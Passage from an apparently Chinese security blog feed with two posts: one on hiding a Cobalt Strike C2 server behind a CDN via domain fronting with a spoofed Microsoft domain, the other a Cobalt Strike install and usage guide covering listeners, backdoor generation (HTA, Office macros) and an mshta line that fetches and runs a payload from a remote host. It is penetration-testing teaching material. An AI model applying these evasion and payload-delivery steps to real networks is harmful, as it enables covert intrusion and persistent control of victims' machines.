src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596333454-8d04000d-0eef-4d46-9dac-c175691593c2.png" alt="img"></a></p><h2 id="SNI域前置"><a href="#SNI域前置" class="headerlink" title="SNI域前置"></a>SNI域前置</h2><h3 id="申请配置CDN"><a href="#申请配置CDN" class="headerlink" title="申请配置CDN"></a>申请配置CDN</h3><p>正常情况下，第一步我们要做的是先申请一个域名（这个域名的作用是用来配合 CDN 来隐藏我们的C2服务器），然后再申请一个CDN对我们所申请的域名进行加速，在这个过程中CDN会要求我们在域名的解析配置中设置相应的 CNAME。</p><p>但由于某云有一个有趣的特点：当 CDN 配置中的源 IP 为自己云服务器时，加速时会跳过对域名的检验，直接与配置中的域名绑定的源服务器IP进行通信。利用该特性，我们不需要去申请域名，也不需要配置该域名的CNAME记录了。换言之，只要我们的C2服务器属于某云的服务器，那么我们就无需申请域名，只需要在申请 CDN 时随便填一个没有人绑定过的域名就行，而且这个域名我们可以填成任何高信誉的域名，例如 test.microsoft.com、wwws.microsoft.com 等。</p><p>接下来我们直接去申请 CDN 即可，这里我把域名填为 wwws.microsoft.com。这里端口80和443端口。80端口流量是不加密的，443端口流量是加密的。</p><p>这里需要注意的是：</p><ul><li>如果是443端口，则后面的 Listener 得是windows&#x2F;beacon_https&#x2F;reverse_https</li><li>如果是80端口，则后面的 Listener 得是windows&#x2F;beacon_http&#x2F;reverse_http</li></ul><p><a href="https://img-blog.csdnimg.cn/20210211103418902.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596333416-8458314a-3680-470f-a427-b2fcbb9de1e4.png" alt="img"></a></p><p>然后下一步即可配置CDN完成</p><p><a href="https://img-blog.csdnimg.cn/20210211103452659.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596333936-34a7d33c-547d-434a-88d1-50e507b0e2fb.png" alt="img"></a></p><p>最终结果如下</p><p><a href="https://img-blog.csdnimg.cn/2021021110360310.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596334294-9de061fd-2237-4dcf-ae17-4659f68cb54c.png" alt="img"></a></p><h3 id="配置CS-profile文件"><a href="#配置CS-profile文件" class="headerlink" title="配置CS profile文件"></a>配置CS profile文件</h3><p>CDN 申请完成后，就可以开始编辑 Cobalt Strike 要用到的 C2 Profile 文件了，我们直接使用开源项目 Malleable-C2-Profiles 中的 <a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile">amazon.profile</a>，但需要把其中的 Host 头改成我们自己在 CDN 中绑定的域名，如图：</p><p><a href="https://img-blog.csdnimg.cn/20210211103659428.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596335067-c34fd689-6266-4076-a004-47fe2fbedbc6.png" alt="img"></a></p><p>然后启动CobaltStrike服务端，加载该profile文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>teamserver C2ip 密码 xx<span class="token punctuation">.</span>profile <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://img-blog.csdnimg.cn/20210211103753137.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596335599-1defb23f-3cca-4ff1-b087-33f0215b5274.png" alt="img"></a></p><h3 id="开启Listener"><a href="#开启Listener" class="headerlink" title="开启Listener"></a>开启Listener</h3><h4 id="使用ip作为Hosts"><a href="#使用ip作为Hosts" class="headerlink" title="使用ip作为Hosts"></a>使用ip作为Hosts</h4><p>以下HTTPS Host(Stager)</p><p><a href="https://img-blog.csdnimg.cn/20210211103905482.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596335798-b011fa37-6dcf-4136-9565-584335efc34f.png" alt="img"></a></p><p>配置完成后如图</p><p><a href="https://img-blog.csdnimg.cn/20210211104039834.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596336152-8cb28aa0-f68e-41c3-bd2e-1af17f5dd39f.png" alt="img"></a></p><p>打开web日志试图，请求CDN服务器ip然后指定Host头部，可以看到web日志有响应</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl <span class="token number">125</span><span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx <span class="token operator">-</span>H <span class="token string">"Host:wwws.microsoft.com"</span> <span class="token operator">-</span>v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://img-blog.csdnimg.cn/20210211104128790.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596337661-b4b4c346-1b16-494a-9233-a47dfca2b58d.png" alt="img"></a></p><h4 id="使用域名作为Hosts"><a href="#使用域名作为Hosts" class="headerlink" title="使用域名作为Hosts"></a>使用域名作为Hosts</h4><p>以下HTTPS Host(Stager)</p><p><a href="https://img-blog.csdnimg.cn/20210211104221362.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596337188-22733982-7172-440a-87bc-3718b4a1c67f.png" alt="img"></a></p><p>配置完成如图</p><p><a href="https://img-blog.csdnimg.cn/20210211104329728.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596337291-b6ea82b8-6488-4fcd-9b1e-2d35f1e907a1.png" alt="img"></a></p><p>打开web日志试图，请求CDN服务器ip然后指定Host头部，可以看到web日志有响应</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com <span class="token operator">-</span>H <span class="token string">"Host:wwws.microsoft.com"</span> <span class="token operator">-</span>v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://img-blog.csdnimg.cn/20210211104443869.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596338359-c65e1040-4edb-4a3b-ad40-ca86ecbd9621.png" alt="img"></a></p><h3 id="生成木马上线"><a href="#生成木马上线" class="headerlink" title="生成木马上线"></a>生成木马上线</h3><p>使用各种方式均可上线。这里我们使用Scripted Web Delivery(S)上线</p><p><a href="https://img-blog.csdnimg.cn/20210211104517697.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596337954-762527c1-9945-401b-9d69-9222080061fa.png" alt="img"></a></p><p>然后在目标机器执行命令上线，可以看到，CS上显示该机器的外部ip为某云的ip，并且该ip是动态变化的。</p><p><a href="https://img-blog.csdnimg.cn/2021021110473074.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596338529-a09c3d1a-e209-4309-bff3-3837c409142c.png" alt="img"></a></p><p><a href="https://img-blog.csdnimg.cn/2021021111143657.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596338971-e891906d-56cb-44b5-9823-43a4633afbcc.png" alt="img"></a></p><p>如果想要上线显示其真正的ip，修改profile文件中的trust_x_forwarded_for为true即可。</p><p><a href="https://img-blog.csdnimg.cn/20210211105113777.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596339277-5598a156-4265-4f98-a12b-a2c4d1809db4.png" alt="img"></a></p><p>在目标机器上执行 netstat -ano 命令查看端口连接，只能看到该机器与某云CDN的ip进行连接，即使封锁了该ip，仍然会与CDN其他ip进行连接，这样就永远无法阻断与C2服务器的连接了</p><p><a href="https://img-blog.csdnimg.cn/20210211105149878.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596340165-d1d9063d-3edc-413e-a7e2-364c9a93a7a2.png" alt="img"></a></p><p>并且使用 wireshark 抓包，可以看到访问的是我们在申请CDN时配置的 wwws.microsoft.com 这个高信任域名。(如下的包得是配置80端口才能抓到，443端口流量加密的抓取不到)</p><p><a href="https://img-blog.csdnimg.cn/20210211105251444.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596341075-89b11854-712c-4626-b8b9-8785362ad956.png" alt="img"></a></p><p>并且不会与我们的C2服务器真实ip进行通信</p><p><a href="https://img-blog.csdnimg.cn/20210211105315982.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596340227-07853b9b-0f47-4693-840c-07094816a9d8.png" alt="img"></a></p><p>最终上线流程图</p><p><a href="https://img-blog.csdnimg.cn/20210211105350816.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596341036-ba03bd43-831b-4f74-8de1-56499dc61cb4.png" alt="img"></a></p><p>通过比较ip作为Hosts和域名作为Hosts，可以发现两者各有优势。</p><ul><li>使用ip作为Hosts：ip是全国各地正常的ip，但是证书不可信</li><li>使用域名作为Hosts：证书可信，但是域名是解析到某云CDN的域名，这样容易被发现</li></ul><h2 id="ESNI域前置"><a href="#ESNI域前置" class="headerlink" title="ESNI域前置"></a>ESNI域前置</h2><p>以下仅限于使用域名作为Hosts，使用ip作为Hosts不用考虑这些。</p><p>在HTTP(S)请求中，目标域名通常显示在三个关键位置：DNS查询，TLS（SNI）拓展及HTTP主机头中。通常，这三个地方都会是我们要访问的域名地址，然而，在”Domain Fronting”请求中，DNS查询以及SNI携带了一个域名（前域），而在HTTP host头中携带了另一个域名（隐蔽的，被禁止访问的域名），简单的图例如下：</p><p><a href="https://img-blog.csdnimg.cn/20181123153848916.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596340719-1acc9f9d-0ec3-49f2-9575-dc52d76a484a.png" alt="img"></a></p><p><a href="https://img-blog.csdnimg.cn/20210211105553707.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596341943-dd006516-7ecb-406f-85be-2178104b3e1e.png" alt="img"></a></p><p><a href="https://img-blog.csdnimg.cn/20210211105620131.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596342383-0f6fe7de-1669-44aa-bca4-575aee237f6a.png" alt="img"></a></p><h3 id="ESNI"><a href="#ESNI" class="headerlink" title="ESNI"></a>ESNI</h3><p>TLS是网络通讯的安全基础（HTTPS）。TLS提供的认证加密使得用户可以确定他们在与谁通讯， 并确保通讯信息不被中间人看到或篡改。 虽然TLS可以隐藏用户通讯的内容，但其并不能总是隐藏与用户通讯的对象。 比如TLS握手可以携带一个叫做加密服务器名称指示（SNI）的扩展, 这个扩展帮助客户端告诉服务器其想要访问的网站的域名。 包括x国在内的审查者利用这一扩展来检查并阻止用户访问特定的网站。</p><p>TLS1.3引入了加密SNI（ESNI）。 简而言之就是用加密了的SNI阻止中间人查看客户端要访问的特定网站。 （更多ESNI的益处请见Cloudflare的介绍文章<a href="https://blog.cloudflare.com/encrypted-sni/">https://blog.cloudflare.com/encrypted-sni/</a> ）。 ESNI有让审查HTTPS流量变得更加困难的潜能; 因为不知道用户使用ESNI访问的网站，审查者要么不封锁任何ESNI连接，要么封锁所有的ESNI连接。</p><p>以下是DefCON28大会分享的议题： Domain Fronting is Dead，Long Live Domain Fronting：Using TLS 1.3 to Evade Censors，Bypass Network Defenses，and Blend in With the Noise <a href="https://www.youtube.com/watch?v=TDg092qe50g&amp;t=646s">https://www.youtube.com/watch?v=TDg092qe50g&amp;t=646s</a></p><p><a href="https://img-blog.csdnimg.cn/20210211105653173.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596342961-3586854f-3680-4275-b90a-4bb8bbd80527.png" alt="img"></a></p><p>但是目前我们国内使用不了ESNI域前置，因为xx防火墙会把所有ESNI的流量包都给丢弃。</p><p>github上的一些ESNI域前置的项目：</p><ul><li><a href="https://github.com/SixGenInc/Noctilucent">https://github.com/SixGenInc/Noctilucent</a></li><li><a href="https://github.com/Ridter/DomainHiding">https://github.com/Ridter/DomainHiding</a></li></ul><p>参考文章： <a href="https://www.anquanke.com/post/id/195011#h2-2">https://www.anquanke.com/post/id/195011#h2-2</a></p><p><a href="https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ">https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike的使用</title>
      <link href="2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/"/>
      <url>2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><p><strong>CobaltStrike</strong>是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！</p><h1 id="CobaltStrike的安装"><a href="#CobaltStrike的安装" class="headerlink" title="CobaltStrike的安装"></a>CobaltStrike的安装</h1><p>我这里以Kali安装为例： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">上传到Kali中，解压：tar <span class="token operator">-</span>xzvf jdk<span class="token operator">-</span>8u191<span class="token operator">-</span>linux<span class="token operator">-</span>x64<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz移动到opt目录下： mv jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span> <span class="token operator">/</span>opt<span class="token operator">/</span>进入jdk目录：cd  <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span>执行 vim  <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bashrc ， 并添加下列内容<span class="token comment"># install JAVA JDK</span>export JAVA_HOME<span class="token operator">=</span><span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span>export CLASSPATH<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">:</span>$<span class="token punctuation">&#123;</span>JAVA_HOME<span class="token punctuation">&#125;</span><span class="token operator">/</span>libexport PATH<span class="token operator">=</span>$<span class="token punctuation">&#123;</span>JAVA_HOME<span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span>$PATH保存退出执行<span class="token punctuation">:</span> source <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bashrc执行：update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>install <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>java java <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>java <span class="token number">1</span>update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>install <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javac javac <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javac <span class="token number">1</span>update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">set</span> java <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javaupdate<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">set</span> javac <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javac查看结果：update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>config javaupdate<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>config javac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078004855-50ca2c2e-29eb-4b60-b131-aaa1d8d97a7b-20220401150223675.png" alt="img"></p><p>安装好了java之后，我们就去安装CobalStrike了！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">上传到Kali中，解压：unzip cobaltstrike<span class="token operator">-</span>linux<span class="token punctuation">.</span><span class="token builtin">zip</span>进入cobalstrike中：cd cobaltstrike<span class="token operator">-</span>linux<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>启动服务端：</strong></p><p>CobaltStrike一些主要文件功能如下：</p><ul><li>agscript：扩展应用的脚本</li><li>c2lint：用于检查profile的错误和异常</li><li>teamserver：服务器端启动程序</li><li>cobaltstrike.jar：CobaltStrike核心程序</li><li>cobaltstrike.auth：用于客户端和服务器端认证的文件，客户端和服务端有一个一模一样的</li><li>cobaltstrike.store：秘钥证书存放文件</li></ul><p>一些目录作用如下：</p><ul><li>data：用于保存当前TeamServer的一些数据</li><li>download：用于存放在目标机器下载的数据</li><li>upload：上传文件的目录</li><li>logs：日志文件，包括Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等</li><li>third-party：第三方工具目录</li></ul><p>对于客户端来说，保存账号密码的文件如下：</p><ul><li>~&#x2F;.aggressor.prop</li></ul><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078005144-5c45d978-8017-40d9-91c4-0d7244674764-20220401150224278.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">启动服务端： <span class="token punctuation">.</span><span class="token operator">/</span>teamserver   <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.11</span>  <span class="token number">123456</span>    <span class="token comment">#192.168.10.11是kali的ip地址，123456是密码</span>后台运行，关闭当前终端依然运行：nohup  <span class="token punctuation">.</span><span class="token operator">/</span>teamserver   <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.11</span>  <span class="token number">123456</span>  <span class="token operator">&amp;</span>这里CobaltStrike默认监听的是<span class="token number">50050</span>端口，如果我们想修改这个默认端口的话，可以打开teamserver文件，将其中的<span class="token number">50050</span>修改成任意一个端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078005822-8b8a9d12-e81c-4376-a9c5-e144d26c3baf-20220401150233310.png" alt="img"></p><p><strong>启动客户端：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>cobaltstrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里host填kali的ip，密码就是刚刚我们启动的密码。 </p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078005486-e96b293b-be5f-42c4-b518-55e3a7110998-20220401150230043.png" alt="img"></p><p>启动后的客户端：</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078004451-9cd405e0-26af-469e-821b-76996a9effa1-20220401150223486.png" alt="img"></p><p>我们也可以打开windows下的cobaltstrike客户端，然后把ip设置为我们的启动时候的ip即可。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078005570-ea2b0976-ba70-45a3-8b60-ef545c067905-20220401150227423.png" alt="img"></p><h1 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">rm <span class="token operator">-</span>rf <span class="token punctuation">.</span>cobaltstrike<span class="token punctuation">.</span>beacon_keys <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf nohup<span class="token punctuation">.</span>out <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf data<span class="token operator">/</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf logs<span class="token operator">/</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf uploads <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf downloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="CobaltStrike的使用"><a href="#CobaltStrike的使用" class="headerlink" title="CobaltStrike的使用"></a>CobaltStrike的使用</h1><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078006653-628ca2ce-e97d-4cb8-b423-395af8c851eb-20220401150223965.png" alt="img"></p><h2 id="CobaltStrike模块"><a href="#CobaltStrike模块" class="headerlink" title="CobaltStrike模块"></a>CobaltStrike模块</h2><ul><li>New Connection：打开一个新连接窗口</li><li>Preferences：偏好设置，就是设置CobaltStrike外观的</li><li>Visualization：将主机以不同的权限展示出来(主要以输出结果的形式展示)</li><li>VPN Interfaces：设置VPN接口</li><li>Listeners：创建监听器</li><li>Script Interfaces：查看和加载CNA脚本</li><li>Close：关闭</li></ul><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078006563-0090a00d-4d70-4cdf-a61b-2824e077dfc4-20220401150223746.png" alt="img"></p><h2 id="创建监听器Listener"><a href="#创建监听器Listener" class="headerlink" title="创建监听器Listener"></a><strong>创建监听器Listener</strong></h2><p>CobaltStrike的内置监听器为Beacon，外置监听器为Foreign。CobaltStrike的Beacon支持异步通信和交互式通信。</p><p>点击左上方CobaltStrike选项——&gt;在下拉框中选择 Listeners ——&gt;在下方弹出区域中单机add</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name：为监听器名字，可任意payload：payload类型HTTP Hosts<span class="token punctuation">:</span> shell反弹的主机，也就是我们kali的ipHTTP Hosts<span class="token punctuation">(</span>Stager<span class="token punctuation">)</span><span class="token punctuation">:</span> Stager的马请求下载payload的地址HTTP Port<span class="token punctuation">(</span>C2<span class="token punctuation">)</span><span class="token punctuation">:</span> C2监听的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078006702-e51812f2-b6e6-45be-ad4f-79398843130f-20220401150223885.png" alt="img"></p><p>CobaltStrike4.0目前有以下8种Payload选项，如下：</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078006770-55c859b5-0f00-4f08-8542-621ea2d41fdc-20220401150223967.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078006962-0ededb46-1c2b-4a4a-b94b-bdebbb2129f2-20220401150224051.png" alt="img"></p><p><strong>内部的Listener</strong></p><ul><li>windows&#x2F;beacon_dns&#x2F;reverse_dns_txt</li><li>windows&#x2F;beacon_http&#x2F;reverse_http</li><li>windows&#x2F;beacon_https&#x2F;reverse_https </li><li>windows&#x2F;beacon_bind_tcp</li><li>windows&#x2F;beacon_bind_pipe</li></ul><p><strong>外部的Listener</strong></p><ul><li>windows&#x2F;foreign&#x2F;reverse_http</li><li>windows&#x2F;foreign&#x2F;reverse_https</li></ul><p><strong>External</strong></p><ul><li>windows&#x2F;beacon_extc2</li></ul><p>Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、HTTPS、SMB。Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用Beacon了。</p><p>Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。</p><p>关于DNS Beacon的使用：<a href="https://xie1997.blog.csdn.net/article/details/106423900">CobaltStrike中DNS Beacon的使用</a></p><h2 id="创建攻击Attacks-生成后门"><a href="#创建攻击Attacks-生成后门" class="headerlink" title="创建攻击Attacks(生成后门)"></a><strong>创建攻击Attacks(生成后门)</strong></h2><p><strong>点击中间的攻击——&gt;生成后门</strong></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078007270-b888a6ca-5033-4b07-b8a4-434031bd1b5e-20220401150224076.png" alt="img"></p><p>这里Attacks有几种，如下：</p><ul><li>HTML Application 生成一个恶意HTML Application木马，后缀格式为 .hta。通过HTML调用其他语言的应用组件进行攻击，提供了 可执行文件、PowerShell、VBA三种方法。</li><li>MS Office Macro 生成office宏病毒文件；</li><li>Payload Generator 生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等的payload</li><li>Windows Executable 生成32位或64位的exe和基于服务的exe、DLL等后门程序</li><li>Windows Executable(S) 用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</li></ul><h3 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h3><p>HTML Application用于生成hta类型的文件。HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。HTML Application有三种类型的生成方式，测试发现，只有powershell方式生成的hta文件才能正常执行上线，Executable和VBA方式生成的hta文件执行的时候提示当前页面的脚本发生错误。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078007675-e0d91d49-6eaa-4149-a963-a057ba60ed45-20220401150224125.png" alt="img"></p><p>基于PowerShell方式生成的hta文件，执行上线</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078007763-d1eb64a7-a482-4d86-ba1a-3b067e8e7ec0-20220401150224157.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078007776-54203014-3b07-4129-90e2-a67ee3604957-20220401150224229.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078007993-0e1acfc7-a687-424b-a368-5e7fc166bc2a-20220401150224247.png" alt="img"></p><p>执行mshta上线成功</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mshta http<span class="token punctuation">:</span><span class="token operator">//</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token operator">/</span>download<span class="token operator">/</span><span class="token builtin">file</span><span class="token punctuation">.</span>ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078008485-0c59e4d2-5637-4c35-a1ad-ed09ba7a73ab-20220401150224443.png" alt="img"></p><p>基于Executable方式生成的hta文件，执行报错如下</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078008444-88084206-fa43-40d5-b716-d7ff95736caf-20220401150224359.png" alt="img"></p><p>基于VBA方式生成的hta文件，执行报错如下</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078008489-a2f5412b-1d03-42e6-96a4-dbdfbdbb1661-20220401150224407.png" alt="img"></p><h3 id="MS-Office-Macro"><a href="#MS-Office-Macro" class="headerlink" title="MS Office Macro"></a>MS Office Macro</h3><p>攻击——&gt;生成后门——&gt;MS Office Macro</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078008676-badc7e5d-e33b-4cf6-8d8e-5263cf6256c5-20220401150224449.png" alt="img"><br>然后选择一个监听器，点击Generate</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078008877-b2f761b7-0559-42df-805b-a52a932590b7-20220401150224472.png" alt="img"></p><p>然后点击Copy Macro</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078009417-649a0dcc-5eb8-4889-9d36-8d9d8930595d-20220401150224573.png" alt="img"></p><p>然后打开word编辑器，点击视图，然后点击宏</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078009911-84bf2599-7fb5-4590-abb3-c600e2073111-20220401150224606.png" alt="img"></p><p>随便输入一个宏名，点击创建</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078009922-eaf40eb4-c94b-4578-9bb1-1f755a29bc2d-20220401150224614.png" alt="img"></p><p>先清除这里面的所有代码，然后复制CobaltStrike生成的代码，保存退出。</p><p><img 